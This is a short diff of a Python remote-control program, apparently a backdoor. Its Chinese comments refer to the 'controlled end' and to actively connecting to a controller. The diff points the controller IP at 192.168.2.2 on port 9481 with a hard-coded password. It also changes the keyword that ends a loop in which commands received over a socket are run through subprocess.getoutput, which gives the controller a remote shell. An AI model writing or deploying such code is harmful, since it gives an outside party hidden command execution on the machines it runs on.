@@ -9,7 +9,7 @@ import subprocess
 
 # 变量定义 ACTIVE 是否主动连接控制端 / TEMP 临时文件路径 / SYS 被控端系统类型 / PATH 被控端文件管理当前路径
 ACTIVE = 1
-IP = '127.0.0.1'
+IP = '192.168.2.2'
 PORT = 9481
 PASS = 'AC131'
 TEMP = None
@@ -194,7 +194,7 @@ def Shell(sock):
     while True:
         d = sock.recv(1024)
         cmd = d.decode('utf-8')
-        if cmd == 'exit':
+        if cmd == '4x00':
             break
         else:
             res = subprocess.getoutput('%s' % cmd)
